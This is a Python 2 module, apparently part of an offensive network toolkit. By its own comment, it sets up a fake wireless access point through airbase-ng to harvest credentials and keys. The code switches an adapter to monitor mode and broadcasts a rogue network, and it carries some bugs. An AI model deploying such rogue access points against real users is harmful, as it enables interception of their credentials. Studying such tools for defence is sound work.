import util, config
import os
from threading import Thread

#
# Implements a fake wireless access point for harvesting credentials/keys/etc
# Requires airbase-ng
#

class APService:
	def __init__(self):
		self.ap_essid = 'zoopzop'
		self.mon_adapt = None
		self.running = False
		self.log_data = False
		self.log_file = None
	
	# init bg
	def initialize_bg(self):
		if not util.check_program('airbase-ng'):
			util.Error('\'airbase-ng\' not found in local path.')
			return False

		while True:
			try:
				tmp = raw_input('[!] Enter ESSID [%s]: '%self.ap_essid)
				if len(tmp) > 2:
					self.ap_essid = tmp
				break
			except KeyboardInterrupt:
				break
			except:
			 	continue

		util.Msg('Initializing access point..')
		thread = Thread(target=self.initialize)
		thread.start()
		return True

	# init
	def initialize(self):
		if not util.check_program('airbase-ng'):
			util.Error('\'airbase-ng\' not found in local path.')
			return False
	
		self.running = True
		ap_proc = None
			
		try:
			self.mon_adapt = util.get_monitor_adapter()
			if self.mon_adapt is None:
				self.mon_adapt = util.enable_monitor()
					
			airbase_cmd = [
						'airbase-ng',
						'--essid', self.ap_essid,
						self.mon_adapt
						  ]
			ap_proc = util.init_app(airbase_cmd, False)
			while self.running: pass
		except Exception, er:
			util.Error('Error with wireless AP: %s'%er)
		finally:
			util.disable_monitor()
			util.kill_app(ap_proc)

	#
	#
	#
	def shutdown(self):
		if self.running:
			self.running = False
		util.debug('Wireless AP shutdown')

	#
	#
	#
	def view(self):
		try:
			while True:
				self.dump = True
		except KeyboardInterrupt:
			self.dump = False

	#
	def log(self, opt, log_loc):
		if opt and not self.log_data:
			try:
				util.debug('Starting WAP logger.')
				self.log_file = open(log_loc, 'w+')
			except Exception, j:
				util.Error('Error opening log file: %s'%j)
				self.log_file = None
				return
			self.log_data = True
		elif not opt and log_data:
			try:
				self.log_file.close()
				self.log_file = None
				self.log_data = False
				util.debug('WAP logger shutdown.')
			except Exception, j:
				util.Error('Error closing WAP logger: %s'%j)
